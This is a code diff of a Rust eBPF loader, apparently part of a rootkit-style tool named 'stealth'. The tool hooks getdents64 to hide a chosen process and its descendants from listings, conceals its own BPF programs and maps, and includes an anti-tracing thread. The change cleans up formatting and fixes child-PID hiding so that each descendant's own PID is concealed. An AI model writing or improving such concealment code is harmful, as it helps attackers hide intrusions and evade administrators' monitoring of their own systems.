@@ -1,5 +1,4 @@
-use core::time;
-use std::{thread, thread::sleep, time::Duration};
+use std::{thread, time::Duration};
 
 use aya::{
     maps::{Array, HashMap},
@@ -11,7 +10,7 @@ use stealth::utils::{
     fetch_pids_map_ids, get_descendants, list_active_maps, list_active_programs, write_to_tracefs,
     Builder, SyscallTracepoint,
 };
-use sysinfo::{Pid,  ProcessesToUpdate, System};
+use sysinfo::{Pid, ProcessesToUpdate, System};
 use tokio::signal;
 
 #[derive(Debug, Parser)]
@@ -32,7 +31,7 @@ impl HiddenPid {
         let mut bytes = [0u8; MAX_PID_LENGTH];
         let len = str_repr.len().min(MAX_PID_LENGTH);
         bytes[..len].copy_from_slice(str_repr.as_bytes());
-        debug!("{}",   unsafe{std::str::from_utf8_unchecked(&bytes)});
+        debug!("{}", unsafe { std::str::from_utf8_unchecked(&bytes) });
         Self { bytes, len }
     }
 }
@@ -73,8 +72,6 @@ async fn main() -> anyhow::Result<()> {
         SyscallTracepoint::from(("stealth_pid_exit", "sys_exit_getdents64")),
     ];
 
-  
-
     let mut ebpf = EbpfLoader::new().load(aya::include_bytes_aligned!(
         "../../target/bpfel-unknown-none/release/stealth"
     ))?;
@@ -92,7 +89,6 @@ async fn main() -> anyhow::Result<()> {
 
     let mut hidden_pids_array: Array<_, HiddenPid> =
         Array::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();
-    hidden_pids_array.set(0, HiddenPid::new(&pid), 0).unwrap();
 
     //setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
     let mut hidden_obj_map: HashMap<_, u32, [u32; 32]> =
@@ -119,10 +115,10 @@ async fn main() -> anyhow::Result<()> {
     let map_ids = bpf_info.map_ids;
 
     for p in prog_ids.clone() {
-        info!("hide bpf prog: {}", p)
+        info!("bpf prog: {} -> hide", p)
     }
     for m in map_ids.clone() {
-        info!("hide bpf map: {}", m)
+        info!("bpf  map: {} -> hide", m)
     }
     thread::spawn({
         move || loop {
@@ -181,27 +177,25 @@ async fn main() -> anyhow::Result<()> {
             }
         }
     });
-    thread::spawn({
-        move ||    // set hidden pids map
-        {
-            sleep(time::Duration::from_secs(3));
+
     let mut sys = System::new_all();
     let _ = sys.refresh_processes(ProcessesToUpdate::All, true);
-    info!("pid:{} -> hide", pid);
-    let p: Pid = Pid::from(pid.parse::<usize>().unwrap()); // replace with your PID
-    
-    let children = get_descendants(&sys, p);
-    for (idx,child) in children.iter().enumerate() {
+
+    hidden_pids_array.set(0, HiddenPid::new(&pid), 0).unwrap();
+    info!("pid: {} -> hide", pid);
+
+    let children = get_descendants(&sys, Pid::from(pid.parse::<usize>().unwrap()));
+    for (idx, child) in children.iter().enumerate() {
         if let Some(task) = sys.process(*child) {
-            info!("pid:{} -> hide child: {} [{:?}]",  p,child,task.name());
+            info!("pid: {} -> hide child: {} [{:?}]", pid, child, task.name());
+        } else {
+            info!("pid: {} -> hide child: {}", pid, child);
         }
-       else{
-        info!("pid:{}  -> hide child: {}",  p,child);
-       }
-        hidden_pids_array.set((idx+1) as u32, HiddenPid::new(&p.to_string()), 0).unwrap();
+        hidden_pids_array
+            .set((idx + 1) as u32, HiddenPid::new(&child.to_string()), 0)
+            .unwrap();
     }
-    }
-    });
+
     //discourage tracing
     thread::spawn({
         move || loop {
